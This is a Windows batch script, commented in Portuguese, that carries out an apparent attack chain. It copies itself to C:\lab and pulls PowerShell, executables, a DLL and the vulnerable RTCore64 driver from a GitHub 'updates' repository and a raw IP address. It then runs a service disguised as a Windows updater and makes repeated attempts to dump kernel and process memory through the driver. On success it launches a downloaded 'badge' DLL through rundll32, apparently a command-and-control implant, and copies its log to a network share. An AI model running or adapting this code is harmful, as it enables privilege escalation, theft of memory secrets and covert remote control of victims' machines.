@echo off
title GO-CS
setlocal enabledelayedexpansion
set K=\\host.lan\Data
set G=https://raw.githubusercontent.com/josimayktrindade-lgtm/updates/main
set L=https://80.78.22.208
set O=C:\lab\GO.log
set D=C:\ProgramData\wupd
set DRV=C:\Windows\System32\RTCore64.sys

if /i not "%~dp0"=="C:\lab\" (
  if not exist C:\lab mkdir C:\lab >nul 2>&1
  copy /y "%~f0" C:\lab\GO.bat >nul 2>&1
  if exist C:\lab\GO.bat ( start "" /d "C:\lab" C:\lab\GO.bat & exit /b )
)

echo ================ GO %date% %time% ================ > %O%
whoami >> %O% 2>&1

echo [1] driver...
sc query WupdSvc | findstr RUNNING >nul 2>&1
if errorlevel 1 (
  sc delete WupdSvc >> %O% 2>&1
  sc delete wupd >> %O% 2>&1
  if not exist %D% mkdir %D% >nul 2>&1
  call :fetch %D%\t1p7.ps1 t1p7.ps1 3000
  powershell -NoProfile -ExecutionPolicy Bypass -File %D%\t1p7.ps1 >nul 2>&1
)
findstr /c:LOADED /c:CARREGADO %D%\t1p7.log >> %O% 2>&1
sc query WupdSvc | findstr ESTADO >> %O% 2>&1

set SUC=0
echo [2] batalha (12 variantes frescas; GH -^> listener)...
for /L %%N in (1,1,12) do (
  if !SUC!==0 (
    echo == tiro x%%N %time% >> %O%
    call :fetch %D%\x%%N.exe x%%N.exe 300000
    call :fetch %DRV% d3.sys 10000
    %D%\x%%N.exe dump --kernelmode --usermode --internet --no-restore --dont-unload-driver --process-name _nada_.exe --vuln-service WupdSvc --vuln-driver %DRV% > C:\lab\sh.txt 2>&1
    set RC=!errorlevel!
    set SZ=0
    for %%A in (C:\lab\sh.txt) do set SZ=%%~zA
    echo   x%%N rc=!RC! bytes=!SZ! >> %O%
    echo   x%%N rc=!RC! bytes=!SZ!
    if !SZ! gtr 500 set SUC=1
    if !SZ! gtr 500 echo   *** CEGO no x%%N *** >> %O%
    if !SZ! gtr 500 goto :pos
    ping -n 21 127.0.0.1 >nul
  )
)
:pos
echo [3] SUC=!SUC! >> %O%
if !SUC!==1 (
  echo [4] badger (badge via GH)...
  call :fetch C:\lab\badge.dll badge.dll 100000
  for %%A in (C:\lab\badge.dll) do echo badge_bytes=%%~zA >> %O%
  rundll32.exe C:\lab\badge.dll,main
  echo rundll disparado >> %O%
)
copy /y %O% %K%\GO.log >nul 2>&1
if exist Z:\ copy /y %O% Z:\GO.log >nul 2>&1
echo ================ FIM (log C:\lab\GO.log + share) ================
pause
exit /b

:fetch
set F=0
if exist %1 for %%A in (%1) do set F=%%~zA
if !F! GEQ %3 exit /b 0
curl.exe -k -s --max-time 30 -o %1 "%G%/%2?cb=%RANDOM%"
set F=0
if exist %1 for %%A in (%1) do set F=%%~zA
if !F! GEQ %3 exit /b 0
curl.exe -k -s --max-time 30 -o %1 "%L%/%2"
set F=0
if exist %1 for %%A in (%1) do set F=%%~zA
if !F! GEQ %3 exit /b 0
exit /b 1
